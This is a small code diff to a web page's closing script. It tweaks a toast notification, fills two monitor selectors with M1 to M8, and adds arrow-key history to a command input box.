-// === Toast ===
-function toast(m){const t=document.createElement('div');t.className='toast';t.textContent='✓ '+m;document.body.appendChild(t);setTimeout(()=>t.remove(),1800)}
-
-// Init monitors
+function toast(m){const t=document.createElement('div');t.className='toast';t.textContent=m;document.body.appendChild(t);setTimeout(()=>t.remove(),1800)}
 (function(){const sel=document.getElementById('monSel');for(let i=0;i<8;i++){const o=document.createElement('option');o.value=i;o.textContent='M'+(i+1);sel.appendChild(o)};const ls=document.getElementById('liveMon');for(let i=0;i<8;i++){const o=document.createElement('option');o.value=i;o.textContent='M'+(i+1);ls.appendChild(o)}})();
-
-// Cmd history
 let cmdHist=[],cmdIdx=-1;
-document.addEventListener('DOMContentLoaded',()=>{
-  const ci=document.getElementById('cmdIn');
-  if(ci)ci.addEventListener('keydown',e=>{
-    if(e.key==='ArrowUp'){e.preventDefault();if(cmdIdx<cmdHist.length-1){cmdIdx++;ci.value=cmdHist[cmdIdx]}}
-    else if(e.key==='ArrowDown'){e.preventDefault();if(cmdIdx>0){cmdIdx--;ci.value=cmdHist[cmdIdx]}else{cmdIdx=-1;ci.value=''}}
-  });
-});
+document.addEventListener('DOMContentLoaded',()=>{const ci=document.getElementById('cmdIn');if(ci)ci.addEventListener('keydown',e=>{if(e.key==='ArrowUp'){e.preventDefault();if(cmdIdx<cmdHist.length-1){cmdIdx++;ci.value=cmdHist[cmdIdx]}}else if(e.key==='ArrowDown'){e.preventDefault();if(cmdIdx>0){cmdIdx--;ci.value=cmdHist[cmdIdx]}else{cmdIdx=-1;ci.value=''}}})});
 const _runCmd=runCmd;async function runCmdWithHist(){const ci=document.getElementById('cmdIn');const c=ci.value.trim();if(!c)return;if(cmdHist.length===0||cmdHist[cmdHist.length-1]!==c)cmdHist.push(c);cmdIdx=-1;return _runCmd()}
 </script>
 </body>
